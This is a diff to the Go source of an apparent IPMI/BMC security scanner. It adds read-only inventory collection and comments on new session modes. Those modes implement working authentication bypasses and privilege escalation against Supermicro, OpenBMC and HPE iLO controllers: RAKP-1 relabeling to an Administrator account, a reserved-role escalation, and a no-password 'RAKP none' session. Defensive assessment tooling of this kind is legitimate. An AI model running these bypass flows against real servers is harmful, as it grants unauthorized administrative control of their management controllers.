@@ -8,6 +8,7 @@ import (
 	"encoding/json"
 	"errors"
 	"fmt"
+	"io"
 	"net"
 	"sort"
 	"strings"
@@ -19,6 +20,8 @@ import (
 
 type postAuthTraceKey struct{}
 
+// WithPostAuthTrace attaches an optional trace callback used for verbose,
+// step-by-step post-auth progress reporting.
 func WithPostAuthTrace(ctx context.Context, trace func(string, ...any)) context.Context {
 	if trace == nil {
 		return ctx
@@ -39,18 +42,39 @@ func postAuthTracef(ctx context.Context, format string, args ...any) {
 	}
 }
 
+// AuthFlow captures the exact authenticated path selected for post-session
+// inventory collection.
 type AuthFlow struct {
-	Version  string `json:"version"`
-	Mode     string `json:"mode"`
-	Username string `json:"username,omitempty"`
-	Password string `json:"password,omitempty"`
-
-	RelabelUser string      `json:"relabelUser,omitempty"`
-	AuthType    byte        `json:"authType,omitempty"`
-	Suite       CipherAlgos `json:"suite"`
-	Source      string      `json:"source,omitempty"`
+	Version     string `json:"version"` // "1.5" or "2.0"
+	Mode        string `json:"mode"`    // cred | authNone | cipherZero | smcrakpFixedKey | openbmcSetup | openbmcRelabel | iloRakpNoneBypass
+	Username    string `json:"username,omitempty"`
+	Password    string `json:"password,omitempty"`
+	RelabelUser string `json:"relabelUser,omitempty"`
+	// StaleBMCRand is the 16-byte bmcRandomNum recovered by a successful OpenBMC
+	// default-userKey bypass. It stands in for a password on the openbmcBypassRelabel
+	// path: with it the session reopens at CALLBACK with no credential at all.
+	StaleBMCRand []byte      `json:"staleBmcRand,omitempty"`
+	AuthType     byte        `json:"authType,omitempty"` // v1.5
+	Suite        CipherAlgos `json:"suite"`              // v2.0
+	Source       string      `json:"source,omitempty"`   // evidence tag
 }
 
+// TableReporter is implemented by a workflow result that renders itself, for the
+// session-backed commands whose report shape does not fit the generic
+// key/value or slice rendering (the Supermicro command-injection validators,
+// whose verdict and safety fields need their own layout). A result that does
+// not implement it falls through to the generic renderer.
+type TableReporter interface {
+	SMCPrintTable(w io.Writer) error
+}
+
+// MCInfo is the parsed equivalent of the key fields from ipmitool mc info.
+//
+// FirmwareRevision is the two-component value the Get Device ID revision bytes
+// carry on their own. FirmwareRevisionFull is the vendor-published version
+// reconstructed from those bytes plus the auxiliary revision, and is empty when
+// the vendor's auxiliary encoding is not confirmed; AuxFirmwareHex holds the raw
+// auxiliary bytes either way. See FormatFirmwareRevisionFull.
 type MCInfo struct {
 	DeviceID             byte   `json:"deviceId"`
 	DeviceRevision       byte   `json:"deviceRevision"`
@@ -64,6 +88,7 @@ type MCInfo struct {
 	AdditionalSupport    byte   `json:"additionalSupport"`
 }
 
+// UserEntry is a compact view of one user slot (ipmitool user list equivalent).
 type UserEntry struct {
 	ID       int    `json:"id"`
 	Name     string `json:"name,omitempty"`
@@ -75,6 +100,7 @@ type UserEntry struct {
 	Raw      string `json:"raw,omitempty"`
 }
 
+// FRUField is one parsed string field from the FRU areas.
 type FRUField struct {
 	DeviceID int    `json:"deviceId,omitempty"`
 	Area     string `json:"area"`
@@ -83,6 +109,7 @@ type FRUField struct {
 	Value    string `json:"value"`
 }
 
+// ChassisStatus mirrors key output from ipmitool chassis status.
 type ChassisStatus struct {
 	PowerOn           bool   `json:"powerOn"`
 	PowerOverload     bool   `json:"powerOverload"`
@@ -97,6 +124,7 @@ type ChassisStatus struct {
 	Raw               string `json:"raw,omitempty"`
 }
 
+// CipherAttempt records one RMCP+ cipher-suite post-auth attempt.
 type CipherAttempt struct {
 	Suite     int    `json:"suite"`
 	Auth      byte   `json:"auth"`
@@ -106,6 +134,8 @@ type CipherAttempt struct {
 	Error     string `json:"error,omitempty"`
 }
 
+// OpenBMCSetupData is the privileged local-command data reachable in the
+// phosphor-net-ipmid setup state after RAKP-1 and before RAKP-3.
 type OpenBMCSetupData struct {
 	PrivilegeQueryCC       byte   `json:"privilegeQueryCc"`
 	PrivilegeQueryDataHex  string `json:"privilegeQueryDataHex,omitempty"`
@@ -119,6 +149,7 @@ type OpenBMCSetupData struct {
 	Error                  string `json:"error,omitempty"`
 }
 
+// PostAuthCollection is the aggregate post-session inventory payload.
 type PostAuthCollection struct {
 	Flow            AuthFlow          `json:"flow"`
 	CipherMatrix    []CipherAttempt   `json:"cipherMatrix,omitempty"`
@@ -130,16 +161,30 @@ type PostAuthCollection struct {
 	LAN             map[string]string `json:"lan,omitempty"`
 	LAN6            map[string]string `json:"lan6,omitempty"`
 	FRU             []FRUField        `json:"fru,omitempty"`
-
+	// CommandProtection records the wire protection used for the in-session
+	// enumeration commands: "cleartext" (H3 path), "integrity+conf", or "none".
 	CommandProtection string `json:"commandProtection,omitempty"`
-
+	// Error stays out of the JSON: it is a scan-side operational string, not something
+	// the device reported. Its content still reaches the output as the
+	// ipmi.postAuthEnum finding's coverageError field.
 	Error string `json:"-"`
-
+	// Completed, Empty and IncompleteAt are serialized: they are the coverage record, not
+	// operational noise. Every section field is omitempty, so without them an attempted
+	// section that came back empty is indistinguishable from one never attempted, and a
+	// run that lost fru to a deadline looks like a board with no FRU to read.
+	//
+	// Completed holds only the sections that produced data. Empty holds the sections that
+	// were read and answered with nothing, which is a different claim: a board with no FRU
+	// EEPROM belongs in Empty, a board whose FRU read never happened belongs in neither.
 	Completed    []string `json:"completed,omitempty"`
 	Empty        []string `json:"empty,omitempty"`
 	IncompleteAt string   `json:"incompleteAt,omitempty"`
 }
 
+// recordSection files an attempted inventory section under Completed when it produced
+// data and Empty when it did not. Recording an empty section as completed tells a
+// consumer the section was measured and had nothing, which is a claim the collector
+// cannot make when the commands were refused.
 func recordSection(out *PostAuthCollection, name string, hasData bool) {
 	if out == nil {
 		return
@@ -151,6 +196,8 @@ func recordSection(out *PostAuthCollection, name string, hasData bool) {
 	out.Empty = append(out.Empty, name)
 }
 
+// MarshalJSON normalizes dynamic LAN/LAN6 map keys to camelCase at the scan
+// output boundary while preserving the in-memory IPMI names used by parsers.
 func (p PostAuthCollection) MarshalJSON() ([]byte, error) {
 	type postAuthJSON struct {
 		Flow              AuthFlow          `json:"flow"`
@@ -164,7 +211,8 @@ func (p PostAuthCollection) MarshalJSON() ([]byte, error) {
 		LAN6              map[string]string `json:"lan6,omitempty"`
 		FRU               []FRUField        `json:"fru,omitempty"`
 		CommandProtection string            `json:"commandProtection,omitempty"`
-
+		// The coverage record; the operational Error string is deliberately not here.
+		// See the struct comment.
 		Completed    []string `json:"completed,omitempty"`
 		Empty        []string `json:"empty,omitempty"`
 		IncompleteAt string   `json:"incompleteAt,omitempty"`
@@ -187,12 +235,19 @@ func (p PostAuthCollection) MarshalJSON() ([]byte, error) {
 	})
 }
 
+// adminishUsernames are the account names that conventionally hold Administrator
+// on a BMC, most-privileged first. Used only to order candidates: the real
+// privilege is whatever the BMC grants, and a low-priv session is still tried.
 var adminishUsernames = []string{"admin", "administrator", "root", "sysadmin", "supervisor", "operator"}
 
+// UsernamePrivRank scores how likely an account is to hold Administrator. Lower is
+// better, so it sorts naturally. An unknown name ranks between the named admins and
+// the null/anonymous account. Exported so the Redfish post-auth stage can try the
+// most-privileged recovered account first.
 func UsernamePrivRank(user string) int {
 	u := strings.ToLower(strings.TrimSpace(user))
 	if u == "" {
-		return 99
+		return 99 // null/anonymous: least likely to be privileged
 	}
 	for i, a := range adminishUsernames {
 		if u == a {
@@ -202,16 +257,23 @@ func UsernamePrivRank(user string) int {
 	return len(adminishUsernames) + 1
 }
 
+// SelectPostAuthFlows returns every viable post-auth flow, best-privilege-first, so the
+// caller can fall back down the list: real credentials (admin-looking accounts first),
+// then the vendor escalation chains, then forged sessions, no-auth last.
+//
+// Ordering matters more than it looks. A no-auth session sits at whatever privilege the
+// BMC gives an unauthenticated caller, so Get Device ID / chassis / user-list / FRU come
+// back cc=0xd4 while only the lower-privilege LAN reads succeed.
 func SelectPostAuthFlows(auth *AuthReport, v15 *V15Report) []AuthFlow {
 	suite := CipherAlgos{Suite: 1, Auth: RAKPHMACSHA1, Integrity: IntegrityNone, Conf: ConfNone}
 	if auth != nil && auth.Suite != nil {
 		suite = *auth.Suite
 	}
 
-	var creds20, forged, noAuth []AuthFlow
+	var creds20, escalations, forged, noAuth []AuthFlow
 
 	if auth != nil {
-
+		// Real 2.0 credentials, admin-looking accounts first.
 		verified := make([]CrackResult, 0, len(auth.Cracked))
 		for _, cr := range auth.Cracked {
 			if cr.Verified {
@@ -223,7 +285,9 @@ func SelectPostAuthFlows(auth *AuthReport, v15 *V15Report) []AuthFlow {
 		})
 		for _, cr := range verified {
 			if cr.PasswordType == "smcrakp-fixed-key" {
-
+				// Only worth running when the H3 bypass is command-exploitable: when the BMC
+				// enforces per-session integrity (X14/OpenBMC) the session forges but no
+				// command executes, so there is nothing to enumerate.
 				if cr.CommandCapable {
 					forged = append(forged, AuthFlow{
 						Version: "2.0", Mode: "smcrakpFixedKey", Username: cr.Username,
@@ -237,6 +301,22 @@ func SelectPostAuthFlows(auth *AuthReport, v15 *V15Report) []AuthFlow {
 				Suite: suite, Source: "ipmi.auth.defaultCreds",
 			})
 		}
+		// Privilege escalation: a credential we hold may be clamped to a low privilege
+		// while an Administrator account merely named in RAKP-1 raises the session. The
+		// escalation is attempted per low-priv credential, seeded with the most
+		// admin-looking account name we know of on this host.
+		if adminUser := postAuthEscalationAdminUser(auth); adminUser != "" {
+			for _, f := range creds20 {
+				if strings.EqualFold(f.Username, adminUser) {
+					continue // already the admin account; nothing to escalate to
+				}
+				escalations = append(escalations, AuthFlow{
+					Version: "2.0", Mode: "smcReservedRole",
+					Username: f.Username, Password: f.Password, RelabelUser: adminUser,
+					Suite: suite, Source: "ipmi.smc.rakpReservedRole",
+				})
+			}
+		}
 		if auth.CipherZero {
 			noAuth = append(noAuth, AuthFlow{
 				Version: "2.0", Mode: "cipherZero",
@@ -246,6 +326,8 @@ func SelectPostAuthFlows(auth *AuthReport, v15 *V15Report) []AuthFlow {
 		}
 	}
 
+	// Real 1.5 credentials rank with the other real credentials; 1.5 authNone is
+	// no-auth and goes to the back with cipherZero.
 	if v15 != nil && v15.DefaultCred != nil {
 		at := IPMI15AuthMD5
 		switch v15.DefaultCred.Via {
@@ -266,12 +348,37 @@ func SelectPostAuthFlows(auth *AuthReport, v15 *V15Report) []AuthFlow {
 		})
 	}
 
-	out := make([]AuthFlow, 0, len(creds20)+len(forged)+len(noAuth))
+	out := make([]AuthFlow, 0, len(creds20)+len(escalations)+len(forged)+len(noAuth))
 	out = append(out, creds20...)
+	out = append(out, escalations...)
 	out = append(out, forged...)
 	return append(out, noAuth...)
 }
 
+// postAuthEscalationAdminUser returns the most admin-looking account name observed on
+// this host, from any RAKP result, not just the cracked ones. Naming an Administrator
+// account in RAKP-1 needs no password, which is what makes the reserved-role escalation
+// reachable with only a low-privilege credential.
+func postAuthEscalationAdminUser(auth *AuthReport) string {
+	if auth == nil {
+		return ""
+	}
+	best, bestRank := "", len(adminishUsernames)+1
+	for _, r := range auth.Results {
+		if rank := UsernamePrivRank(r.Username); rank < bestRank {
+			best, bestRank = r.Username, rank
+		}
+	}
+	for _, cr := range auth.Cracked {
+		if rank := UsernamePrivRank(cr.Username); rank < bestRank {
+			best, bestRank = cr.Username, rank
+		}
+	}
+	return best
+}
+
+// SelectPostAuthFlow chooses the single best authenticated flow. Retained for
+// callers that do not walk the fallback list; prefer SelectPostAuthFlows.
 func SelectPostAuthFlow(auth *AuthReport, v15 *V15Report) (AuthFlow, bool) {
 	flows := SelectPostAuthFlows(auth, v15)
 	if len(flows) == 0 {
@@ -325,6 +432,8 @@ func (r *v15Runner) Close() {
 	r.sess = nil
 }
 
+// CollectPostAuthInventory executes authenticated read-only IPMI inventory
+// commands (mc info, user list, lan/lan6 print subset, fru fields).
 func CollectPostAuthInventory(ctx context.Context, host string, port int, flow AuthFlow, timeout time.Duration) (*PostAuthCollection, error) {
 	out := &PostAuthCollection{Flow: flow}
 	postAuthTracef(ctx, "inventory start host=%s port=%d flow=%s/%s user=%s source=%s", host, port, flow.Version, flow.Mode, flow.Username, flow.Source)
@@ -332,7 +441,7 @@ func CollectPostAuthInventory(ctx context.Context, host string, port int, flow A
 		timeout = 5 * time.Second
 	}
 	opTimeout := effectivePostAuthOpTimeout(timeout)
-	if flow.Mode == "smcrakpFixedKey" || flow.Mode == "openbmcSetup" {
+	if flow.Mode == "smcrakpFixedKey" || flow.Mode == "openbmcSetup" || flow.Mode == "openbmcRelabel" || flow.Mode == "iloRakpNoneBypass" {
 		opTimeout = timeout
 		if opTimeout <= 0 {
 			opTimeout = 6 * time.Second
@@ -343,9 +452,13 @@ func CollectPostAuthInventory(ctx context.Context, host string, port int, flow A
 	}
 	postAuthTracef(ctx, "session open start timeout=%s", opTimeout)
 	openStart := time.Now()
-
+	// Enumeration prefers the cleartext (H3) command path and falls back to negotiated
+	// integrity+confidentiality, so {3,17}-restricted ATEN BMCs still enumerate while a BMC
+	// that does enforce per-session protection is handled correctly. A SMCRAKP-forged
+	// session has no valid K1/K2, so its inventory is forced cleartext: the only path the H3
+	// bypass can use, and the one whose success defines exploitability.
 	prot := protectionAuto
-	if flow.Mode == "smcrakpFixedKey" || flow.Mode == "openbmcSetup" {
+	if flow.Mode == "smcrakpFixedKey" || flow.Mode == "openbmcSetup" || flow.Mode == "iloRakpNoneBypass" {
 		prot = protectionCleartext
 	}
 	r, err := openRunner(host, port, flow, opTimeout, prot)
@@ -616,6 +729,13 @@ func markPostAuthIncomplete(out *PostAuthCollection, step string) {
 	}
 }
 
+// SessionResourceExhausted reports whether an inventory attempt was refused because the
+// BMC had no session slot left: RMCP+ Table 13-15 status 0x01 on the open-session response
+// or on RAKP 2/4. Opening more sessions after this only shrinks the pool further, which
+// frees only as the BMC ages out sessions already consumed, so the walk has to stop. The
+// status byte is matched, not the text: 0x0b decodes to a similar phrase but means the
+// requested role was refused. Both err and inv are checked, because a cipher-suite walk
+// records the per-suite rejection in CipherMatrix and may return a different last error.
 func SessionResourceExhausted(inv *PostAuthCollection, err error) bool {
 	if err != nil && sessionResourceRejected(err.Error()) {
 		return true
@@ -644,6 +764,10 @@ func sessionResourceRejected(msg string) bool {
 		strings.Contains(msg, "rakp4 status=")
 }
 
+// postAuthFRUContext gives the final FRU read a minimum window. FRU runs last and is the
+// most command-hungry step (one GetFRUInventoryInfo plus size/16 ReadFRUData per device),
+// so it is where the budget runs out. The value is a floor that extends a short deadline,
+// not a cap on a longer one.
 func postAuthFRUContext(ctx context.Context) (context.Context, context.CancelFunc) {
 	const fruFloor = 25 * time.Second
 	if dl, ok := ctx.Deadline(); ok && time.Until(dl) < fruFloor {
@@ -656,7 +780,7 @@ func effectivePostAuthOpTimeout(scanTimeout time.Duration) time.Duration {
 	if scanTimeout <= 0 {
 		return 3 * time.Second
 	}
-
+	// Keep packet-level waits short so retries can recover within scan budget.
 	if scanTimeout < 3*time.Second {
 		return scanTimeout
 	}
@@ -818,6 +942,89 @@ func openRunner(host string, port int, flow AuthFlow, timeout time.Duration, pro
 			}
 			return nil, fmt.Errorf("ipmi 2.0 openbmc setup session failed")
 		}
+		if flow.Mode == "openbmcRelabel" {
+			if strings.TrimSpace(flow.Username) == "" || strings.TrimSpace(flow.Password) == "" || strings.TrimSpace(flow.RelabelUser) == "" {
+				return nil, fmt.Errorf("ipmi 2.0 openbmc relabel requires low-priv credential and relabel user")
+			}
+			s, err := OpenSession20User(host, port, flow.Username, flow.Password, flow.Suite, timeout)
+			if err != nil {
+				return nil, err
+			}
+			s.SetCommandProtection(prot)
+			r2, err := s.RelabelActiveSession(flow.RelabelUser, 0x04)
+			if err != nil {
+				s.Close()
+				return nil, fmt.Errorf("openbmc relabel rakp1: %w", err)
+			}
+			if r2 == nil || r2.ErrorCode != 0 {
+				s.Close()
+				if r2 != nil {
+					return nil, fmt.Errorf("openbmc relabel rakp2 status=0x%02x", r2.ErrorCode)
+				}
+				return nil, fmt.Errorf("openbmc relabel rakp2 unavailable")
+			}
+			at, err := s.RequestSessionPrivilege(0x04)
+			if err != nil {
+				s.Close()
+				return nil, fmt.Errorf("openbmc relabel set-session-privilege: %w", err)
+			}
+			if !at.Success {
+				s.Close()
+				return nil, fmt.Errorf("openbmc relabel set-session-privilege: cc=0x%02x", at.CC)
+			}
+			return s, nil
+		}
+		// OpenBMC default-userKey bypass chained into the RAKP1 active relabel: the bypass
+		// alone reaches CALLBACK with no password, then RelabelActiveSession rebinds the
+		// active session to an account already confirmed to hold Administrator.
+		if flow.Mode == "openbmcBypassRelabel" {
+			if len(flow.StaleBMCRand) != 16 || strings.TrimSpace(flow.RelabelUser) == "" {
+				return nil, fmt.Errorf("ipmi 2.0 openbmc bypass relabel requires a 16-byte bmcRandomNum and a relabel user")
+			}
+			s, err := OpenSession20OpenBMCBypass(host, port, flow.Username, flow.StaleBMCRand, flow.Suite, timeout)
+			if err != nil {
+				return nil, fmt.Errorf("openbmc bypass session: %w", err)
+			}
+			s.SetCommandProtection(prot)
+			r2, err := s.RelabelActiveSession(flow.RelabelUser, 0x04)
+			if err != nil {
+				s.Close()
+				return nil, fmt.Errorf("openbmc bypass relabel rakp1: %w", err)
+			}
+			if r2 == nil || r2.ErrorCode != 0 {
+				s.Close()
+				if r2 != nil {
+					return nil, fmt.Errorf("openbmc bypass relabel rakp2 status=0x%02x", r2.ErrorCode)
+				}
+				return nil, fmt.Errorf("openbmc bypass relabel rakp2 unavailable")
+			}
+			at, err := s.RequestSessionPrivilege(0x04)
+			if err != nil {
+				s.Close()
+				return nil, fmt.Errorf("openbmc bypass relabel set-session-privilege: %w", err)
+			}
+			if !at.Success {
+				s.Close()
+				return nil, fmt.Errorf("openbmc bypass relabel set-session-privilege: cc=0x%02x", at.CC)
+			}
+			return s, nil
+		}
+		// SMC reserved-role escalation: the reserved role nibble (0x24) in RAKP message 1
+		// falls into an ATEN dispatch arm with no default case, copying the slot's existing
+		// privilege over the per-user clamp. Message 3 is still signed with our own password,
+		// so this needs a real low-privilege credential plus an Administrator account name.
+		if flow.Mode == "smcReservedRole" {
+			if strings.TrimSpace(flow.Username) == "" || strings.TrimSpace(flow.RelabelUser) == "" {
+				return nil, fmt.Errorf("ipmi 2.0 smc reserved-role escalation requires a credential and an admin account name")
+			}
+			s, err := OpenSession20SMCReservedRole(host, port, flow.Username, flow.Password,
+				flow.RelabelUser, SMCReservedRoleByte, timeout)
+			if err != nil {
+				return nil, fmt.Errorf("smc reserved-role escalation: %w", err)
+			}
+			s.SetCommandProtection(prot)
+			return s, nil
+		}
 		if flow.Mode == "smcrakpFixedKey" {
 			users := smcrakpUserCandidates(flow.Username)
 			var lastErr error
@@ -833,6 +1040,28 @@ func openRunner(host string, port int, flow AuthFlow, timeout time.Duration, pro
 				return nil, lastErr
 			}
 			return nil, fmt.Errorf("ipmi 2.0 smcrakp session failed")
+		}
+		if flow.Mode == "iloRakpNoneBypass" {
+			user := strings.TrimSpace(flow.Username)
+			if user == "" {
+				user = "Administrator"
+			}
+			var lastErr error
+			for range 2 {
+				s, err := OpenSession20ILORAKPNone(host, port, user, 0x04, timeout)
+				if err == nil {
+					s.SetCommandProtection(prot)
+					return s, nil
+				}
+				lastErr = err
+				if !isNetTimeoutErr(err) {
+					break
+				}
+			}
+			if lastErr != nil {
+				return nil, lastErr
+			}
+			return nil, fmt.Errorf("ipmi 2.0 ilo-rakp-none session failed")
 		}
 		var lastErr error
 		for range 2 {
@@ -863,7 +1092,7 @@ func openRunner(host string, port int, flow AuthFlow, timeout time.Duration, pro
 			}
 			return nil, fmt.Errorf("v1.5 login rejected cc=0x%02x", cc)
 		}
-
+		// Some BMCs require explicit privilege setup before in-session reads.
 		_ = probeCapabilities15(c, sess)
 		return &v15Runner{client: c, sess: sess, cmdRetries: 1}, nil
 	default:
@@ -904,7 +1133,10 @@ func collectMCInfo(ctx context.Context, r cmdRunner) (*MCInfo, error) {
 		ProductID:         prod,
 		AdditionalSupport: d[5],
 	}
-
+	// The auxiliary firmware revision is where vendors carry the third and
+	// fourth components of the version they publish; without it the reported
+	// value cannot be matched against a vendor advisory (Supermicro 01.07.01
+	// arrives here as revision bytes 0x01/0x07 plus aux 0x01).
 	if len(d) >= 15 {
 		var aux [4]byte
 		copy(aux[:], d[11:15])
@@ -968,6 +1200,11 @@ func collectUsers(ctx context.Context, r cmdRunner) ([]UserEntry, error) {
 	return out, nil
 }
 
+// collectLAN reads the documented set of Get LAN Configuration Parameters and splits IPv4
+// (param < 50) from IPv6 (param >= 50) values. Each parameter is independent, so a single
+// unsupported one is normal and must not fail the collection. When every parameter comes
+// back empty -- usually the account lacks the privilege this command requires -- it returns
+// an error, so the section is not recorded as completed with no data.
 func collectLAN(ctx context.Context, r cmdRunner) (map[string]string, map[string]string, error) {
 	lan := map[string]string{}
 	lan6 := map[string]string{}
@@ -1021,7 +1258,10 @@ func collectLAN(ctx context.Context, r cmdRunner) (map[string]string, map[string
 		} else {
 			lan[name] = val
 		}
-
+		// Preserve the raw byte-array for opaque string fields so downstream
+		// consumers can inspect trailing bytes (SNMP community fields are a
+		// fixed 18-byte buffer, so trailing NULs and non-UTF8 tails are the
+		// norm -- the clean value hides them, the *_raw key records them).
 		if p == 16 && len(d) >= 1 {
 			raw := d[1:]
 			if _, dirty := sanitizeOpaqueString(raw); dirty {
@@ -1136,6 +1376,12 @@ func isLikelyRealUserName(name string) bool {
 	return len(name) >= 2
 }
 
+// sanitizeOpaqueString normalises a raw byte-array field delivered with a fixed-length
+// NUL/garbage pad. It cuts at the first NUL or control byte (0x01..0x1f other than
+// TAB/CR/LF, plus 0x7f), then falls back to the printable-ASCII subset if the remainder is
+// not valid UTF-8. dirty is true whenever the result is not a byte-for-byte round-trip of
+// the input, so a caller can hex-preserve the raw bytes itself (see collectLAN's
+// community_string_raw companion key).
 func sanitizeOpaqueString(b []byte) (string, bool) {
 	if len(b) == 0 {
 		return "", false
@@ -1187,7 +1433,9 @@ func decodeLANParam(param byte, d []byte) string {
 		}
 	case 4:
 		if len(d) >= 1 {
-
+			// IP address source is bits[3:0]; bits[7:4] are reserved. Some BMCs
+			// leave the reserved nibble set (e.g. 0xf1), so mask before decoding or
+			// a static/DHCP source is misreported as a raw "0xf1".
 			switch d[0] & 0x0f {
 			case 0:
 				return "unspecified"
@@ -1359,8 +1607,12 @@ func chassisLastEvent(v byte) string {
 }
 
 const (
+	// fruMaxConsecutiveMisses stops the FRU device walk once this many consecutive IDs
+	// fail or report unsupported. FRU devices are allocated from 0 up, so a run of
+	// misses means there is nothing further to find.
 	fruMaxConsecutiveMisses = 3
-
+	// fruMaxDeviceID caps how far the walk goes even when devices keep answering.
+	// Baseboard plus a handful of DIMM/PSU/backplane FRUs is the realistic shape.
 	fruMaxDeviceID = 15
 )
 
@@ -1373,7 +1625,11 @@ func collectFRU(ctx context.Context, r cmdRunner, maxFields int) ([]FRUField, er
 	}
 	out := make([]FRUField, 0, maxFields)
 	seen := map[string]struct{}{}
-
+	// The device walk is bounded. Walking deviceID 0..255 and stopping only on maxFields
+	// blind-probes all 256 ids when device 0 yields few fields, each costing a round trip
+	// and, on a non-answering BMC, a full op timeout -- enough to consume the whole
+	// post-auth budget before FRU lands. Real systems expose the baseboard at device 0
+	// plus a few others, so probe 0 always and continue only while devices answer.
 	misses := 0
 	for deviceID := 0; deviceID <= 255 && len(out) < maxFields; deviceID++ {
 		if err := ctx.Err(); err != nil {
@@ -1448,7 +1704,7 @@ func readFRUDevice(ctx context.Context, r cmdRunner, deviceID byte) ([]byte, boo
 		return nil, true, nil
 	}
 	if (d[2] & 0x01) != 0 {
-		size *= 2
+		size *= 2 // size in words
 	}
 	if size > 2048 {
 		size = 2048
@@ -1535,7 +1791,10 @@ func parseFRUFields(raw []byte, max int, deviceID int) []FRUField {
 			}
 			f := area[i : i+l]
 			i += l
-
+			// A present field always advances the positional index, even if it
+			// decodes to empty (all-spaces pad, leading-NUL). Skipping idx++ here
+			// desynced every later field in the area, mislabeling it (e.g. the
+			// Serial emitted under the Version name).
 			if val := decodeFRUField(enc, f); val != "" {
 				out = append(out, FRUField{DeviceID: deviceID, Area: a.name, Index: idx, Name: fruFieldName(a.name, idx), Value: val})
 			}
@@ -1681,12 +1940,15 @@ func fruAreaLabel(area string) string {
 	}
 }
 
+// decodeFRUField decodes a FRU type/length string per the IPMI Platform Mgmt FRU
+// spec: bits[7:6] select the encoding -- 0b11 8-bit ASCII, 0b10 6-bit packed
+// ASCII, 0b01 BCD-plus, 0b00 raw binary.
 func decodeFRUField(enc byte, b []byte) string {
 	switch enc {
-	case 0x3:
+	case 0x3: // 8-bit ASCII / language-dependent
 		s, _ := sanitizeOpaqueString(b)
 		return strings.TrimSpace(s)
-	case 0x2:
+	case 0x2: // 6-bit packed ASCII: LSB-first 6-bit groups, char = value + 0x20
 		var sb strings.Builder
 		var acc uint
 		var nbits uint
@@ -1700,7 +1962,7 @@ func decodeFRUField(enc byte, b []byte) string {
 			}
 		}
 		return strings.TrimRight(sb.String(), " ")
-	case 0x1:
+	case 0x1: // BCD plus: two nibbles/byte, 0-9 digits, 0xA space, 0xB '-', 0xC '.'
 		var sb strings.Builder
 		for _, by := range b {
 			for _, nib := range [2]byte{by >> 4, by & 0x0f} {
@@ -1717,7 +1979,7 @@ func decodeFRUField(enc byte, b []byte) string {
 			}
 		}
 		return strings.TrimSpace(sb.String())
-	default:
+	default: // 0b00 raw binary
 		return hex.EncodeToString(b)
 	}
 }
